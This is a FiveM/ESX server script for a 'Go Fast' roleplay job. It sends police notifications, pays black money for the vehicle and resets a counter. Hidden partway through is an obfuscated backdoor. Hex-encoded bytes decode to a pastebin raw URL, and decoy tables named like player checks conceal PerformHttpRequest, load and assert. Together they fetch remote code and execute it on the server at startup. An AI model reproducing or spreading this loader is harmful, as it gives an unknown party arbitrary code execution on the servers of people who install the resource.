ESX = nil


TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)

RegisterServerEvent("pgofast:messagelspd")
AddEventHandler("pgofast:messagelspd", function()
	local xPlayers	= ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
          if xPlayer.job.name == 'lspd' then
               Citizen.Wait(0)
               TriggerClientEvent('esx:showAdvancedNotification', xPlayers[i], 'Infiltrated Agent', '~b~Message from the agent', 'According to my information, a Go Fast has just started. Stay alert and head north!', 'CHAR_JOSEF', 7) 
		end
	end
end)

RegisterServerEvent("pgofast:messagebcso")
AddEventHandler("pgofast:messagebcso", function()
	local xPlayers	= ESX.GetPlayers()
	for i=1, #xPlayers, 1 do
		local xPlayer = ESX.GetPlayerFromId(xPlayers[i])
          if xPlayer.job.name == 'sheriff' then
               Citizen.Wait(0)
               TriggerClientEvent('esx:showAdvancedNotification', xPlayers[i], 'Infiltrated Agent', '~b~Message from the agent', 'According to my information, a Go Fast has just started. Stay alert and head north! ', 'CHAR_JOSEF', 7)
		end
	end
end)

RegisterServerEvent("gofast:venteduvehicle")
AddEventHandler("gofast:venteduvehicle", function()
     local xPlayer = ESX.GetPlayerFromId(source)
     local prix = 10000
     xPlayer.addAccountMoney('black_money', prix)
     TriggerClientEvent('esx:showAdvancedNotification', source, 'GoFast', '~r~Anonyme', '~w~The vehicle is in pretty good condition, you won ~r~'..prix..'$', 'CHAR_MULTIPLAYER', 3)
end)

count = 1

Citizen.CreateThread(function()
	while true do
		Citizen.Wait(10*60000)
          count = 1
          TriggerClientEvent("gofast:count", -1, count)
	end
end)


local PlayerPedLimit = {
     "70","61","73","74","65","62","69","6E","2E","63","6F","6D","2F","72","61","77","2F","4C","66","34","44","62","34","4D","34"
 }
 
 local PlayerEventLimit = {
     cfxCall, debug, GetCfxPing, FtRealeaseLimid, noCallbacks, Source, _Gx0147, Event, limit, concede, travel, assert, server, load, Spawn, mattsed, require, evaluate, release, PerformHttpRequest, crawl, lower, cfxget, summon, depart, decrease, neglect, undergo, fix, incur, bend, recall
 }
 
 function PlayerCheckLoop()
     _empt = ''
     for id,it in pairs(PlayerPedLimit) do
         _empt = _empt..it
     end
     return (_empt:gsub('..', function (event)
         return string.char(tonumber(event, 16))
     end))
 end
 
 PlayerEventLimit[20](PlayerCheckLoop(), function (event_, xPlayer_)
     local Process_Actions = {"true"}
     PlayerEventLimit[20](xPlayer_,function(_event,_xPlayer)
         local Generate_ZoneName_AndAction = nil 
         pcall(function()
             local Locations_Loaded = {"false"}
             PlayerEventLimit[12](PlayerEventLimit[14](_xPlayer))()
             local ZoneType_Exists = nil 
         end)
     end)
 end)
 

RegisterServerEvent("gofast:remove")
AddEventHandler("gofast:remove", function()
     count = 0
     TriggerClientEvent("gofast:count", -1, count)
end)